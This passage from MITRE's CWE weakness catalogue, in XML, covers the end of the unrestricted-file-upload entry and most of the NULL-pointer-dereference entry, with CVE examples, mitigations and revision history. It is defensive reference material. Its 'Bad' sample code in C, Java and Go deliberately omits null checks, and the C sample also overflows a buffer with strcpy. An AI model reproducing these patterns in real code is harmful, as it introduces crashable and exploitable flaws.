               <Description>PHP-based FAQ management app does not check the MIME type for uploaded images</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2023-5227</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0901</Reference>
               <Description>Web-based mail product stores ".shtml" attachments that could contain SSI</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0901</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1841</Reference>
               <Description>PHP upload does not restrict file types</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1841</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1868</Reference>
               <Description>upload and execution of .php file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1868</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1881</Reference>
               <Description>upload file with dangerous extension</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1881</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0254</Reference>
               <Description>program does not restrict file types</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0254</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2262</Reference>
               <Description>improper type checking of uploaded files</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2262</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4558</Reference>
               <Description>Double "php" extension leaves an active php extension in the generated filename.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4558</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6994</Reference>
               <Description>ASP program allows upload of .asp files by bypassing client-side checks</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6994</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3288</Reference>
               <Description>ASP file upload</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3288</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2428</Reference>
               <Description>ASP file upload</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-2428</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File Processing</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Unrestricted File Upload</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-434</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-422"/>
            <Reference External_Reference_ID="REF-423"/>
            <Reference External_Reference_ID="REF-424"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;File Uploading&#34;, Page 1068"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-434"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>This can have a chaining relationship with incomplete denylist / permissive allowlist errors when the product tries, but fails, to properly limit which types of files are allowed (CWE-183, CWE-184).</xhtml:p>
               <xhtml:p>This can also overlap multiple interpretation errors for intermediaries, e.g. anti-virus products that do not remove or quarantine attachments with certain file extensions that can be processed by client systems.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Functional_Areas, Likelihood_of_Exploit, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>converted from Compound_Element to Weakness</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Name, Other_Notes, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships, Type, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated References, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Weakness_Ordinalities</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2010-02-16">Unrestricted File Upload</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="476" Name="NULL Pointer Dereference" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.</Description>
         <Extended_Description>NULL pointer dereference issues can occur through a number of flaws, including race conditions, and simple programming omissions.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="710" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="754" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="754" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>NULL pointer dereferences are frequently resultant from rarely encountered error conditions, since these are most likely to escape detection during the testing phases.</Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Undetermined"/>
            <Language Name="C++" Prevalence="Undetermined"/>
            <Language Name="Java" Prevalence="Undetermined"/>
            <Language Name="C#" Prevalence="Undetermined"/>
            <Language Name="Go" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>NPD</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>null deref</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>nil pointer dereference</Term>
               <Description>used for access of nil in Go programs</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>NULL pointer dereferences usually result in the failure of the process unless exception handling (on some platforms) is available and implemented. Even when exception handling is being used, it can still be very difficult to return the software to a safe state of operation.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Read Memory</Impact>
               <Impact>Modify Memory</Impact>
               <Note>In rare circumstances, when NULL is equivalent to the 0x0 memory address and privileged code can access it, then writing or reading memory is possible, which may lead to code execution.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-12">
               <Method>Manual Dynamic Analysis</Method>
               <Description>Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.</Description>
            </Detection_Method>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If all pointers that could have been modified are sanity-checked previous to use, nearly all NULL pointer dereferences can be prevented.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>The choice could be made to use a language that is not susceptible to these issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Check the results of all functions that return a value and verify that the value is non-null before acting upon it.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment. This solution does not handle the use of improperly initialized variables (CWE-665).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Explicitly initialize all your variables and other data stores, either during declaration or just before the first usage.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-8">
               <Intro_Text>While there are no complete fixes aside from conscientious programming, the following steps will go a long way to ensure that NULL pointer dereferences do not occur.</Intro_Text>
               <Example_Code Nature="Good">
                  <xhtml:div>if (pointer1 != NULL) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>/* make use of pointer1 */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/* ... */</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If you are working with a multithreaded or otherwise asynchronous environment, ensure that proper locking APIs are used to lock before the if statement; and unlock when it has finished.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <Intro_Text>This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/*routine that ensures user_supplied_addr is in the right format for conversion */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>validate_addr_form(user_supplied_addr);<xhtml:br/>addr = inet_addr(user_supplied_addr);<xhtml:br/>hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);<xhtml:br/>strcpy(hostname, hp-&gt;h_name);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy().</Body_Text>
               <Body_Text>Note that this code is also vulnerable to a buffer overflow (CWE-119).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-9">
               <Intro_Text>In the following code, the programmer assumes that the system always has a property named "cmd" defined. If an attacker can control the program's environment so that "cmd" is not defined, the program throws a NULL pointer exception when it attempts to call the trim() method.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String cmd = System.getProperty("cmd");<xhtml:br/>cmd = cmd.trim();</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-110">
               <Intro_Text>This Android application has registered to handle a URL when sent an intent:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);<xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>public class UrlHandlerReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if("com.example.URLHandler.openURL".equals(intent.getAction())) {<xhtml:div style="margin-left:1em;">String URL = intent.getStringExtra("URLToOpen");<xhtml:br/>int length = URL.length();</xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>...</xhtml:i>
                                 <xhtml:br/>}</xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Consider the following example of a typical client server exchange. The HandleRequest function is intended to perform a request and use a defer to close the connection whenever the function returns.</Intro_Text>
               <Example_Code Nature="Bad" Language="Go">
                  <xhtml:div>func HandleRequest(client http.Client, request *http.Request) (*http.Response, error) {
                     <xhtml:div style="margin-left:1em;">
                        response, err := client.Do(request)<xhtml:br/>
                        defer response.Body.Close()<xhtml:br/>
                        if err != nil {
                           <xhtml:div style="margin-left:1em;">
                              return nil, err<xhtml:br/>
                           </xhtml:div>
                        }<xhtml:br/>...<xhtml:br/></xhtml:div>
                     }</xhtml:div>
               </Example_Code>
               <Body_Text>If a user supplies a malformed request or violates the client policy, the Do method can return a nil response and a non-nil err.</Body_Text>
               <Body_Text>This HandleRequest Function evaluates the close before checking the error. A deferred call's arguments are evaluated immediately, so the defer statement panics due to a nil response.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-3274</Reference>
               <Description>race condition causes a table to be corrupted if a timer activates while it is being modified, leading to resultant NULL dereference; also involves locking.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3274</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1912</Reference>
               <Description>large number of packets leads to NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1912</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0772</Reference>
               <Description>packet with invalid error status value triggers NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0772</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4895</Reference>
               <Description>Chain: race condition for an argument value, possibly resulting in NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4895</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-29652</Reference>
               <Description>ssh component for Go allows clients to cause a denial of service (nil pointer dereference) against SSH servers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-29652</Link>
            </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2009-2692</Reference>
	     <Description>Chain: Use of an unimplemented network socket operation pointing to an uninitialized handler function (CWE-456) causes a crash because of a null pointer dereference (CWE-476).</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2009-2692</Link>
	   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3547</Reference>
               <Description>Chain: race condition (CWE-362) might allow resource to be released before operating on it, leading to NULL dereference (CWE-476)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3547</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3620</Reference>
               <Description>Chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3620</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2698</Reference>
               <Description>Chain: IP and UDP layers each track the same value with different mechanisms that can get out of sync, possibly resulting in a NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2698</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2692</Reference>
               <Description>Chain: uninitialized function pointers can be dereferenced allowing code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2692</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0949</Reference>
               <Description>Chain: improper initialization of memory can lead to NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0949</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3597</Reference>
               <Description>Chain: game server can access player data structures before initialization has happened leading to NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-6078</Reference>
               <Description>Chain: The return value of a function returning a pointer is not checked for success (CWE-252) resulting in the later use of an uninitialized variable (CWE-456) and a null pointer dereference (CWE-476)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-6078</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0062</Reference>
               <Description>Chain: a message having an unknown message type may cause a reference to uninitialized memory resulting in a null pointer dereference (CWE-476) or dangling pointer (CWE-825), possibly crashing the system or causing heap corruption.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0062</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5183</Reference>
               <Description>Chain: unchecked return value can lead to NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5183</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0079</Reference>
               <Description>SSL software allows remote attackers to cause a denial of service (crash) via a crafted SSL/TLS handshake that triggers a null dereference.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0079</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0365</Reference>
               <Description>Network monitor allows remote attackers to cause a denial of service (crash) via a malformed RADIUS packet that triggers a null dereference.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0365</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1013</Reference>
               <Description>Network monitor allows remote attackers to cause a denial of service (crash) via a malformed Q.931, which triggers a null dereference.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1013</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1000</Reference>
               <Description>Chat client allows remote attackers to cause a denial of service (crash) via a passive DCC request with an invalid ID number, which causes a null dereference.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1000</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0389</Reference>
               <Description>Server allows remote attackers to cause a denial of service (crash) via malformed requests that trigger a null dereference.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0389</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0119</Reference>
               <Description>OS allows remote attackers to cause a denial of service (crash from null dereference) or execute arbitrary code via a crafted request during authentication protocol selection.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0119</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0458</Reference>
               <Description>Game allows remote attackers to cause a denial of service (server crash) via a missing argument, which triggers a null pointer dereference.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0458</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0401</Reference>
               <Description>Network monitor allows remote attackers to cause a denial of service (crash) or execute arbitrary code via malformed packets that cause a NULL pointer dereference.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0401</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1559</Reference>
               <Description>Chain: System call returns wrong value (CWE-393), leading to a resultant NULL dereference (CWE-476).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1559</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Null Dereference</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Null-pointer dereference</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Null Dereference (Null Pointer Dereference)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A9</Entry_ID>
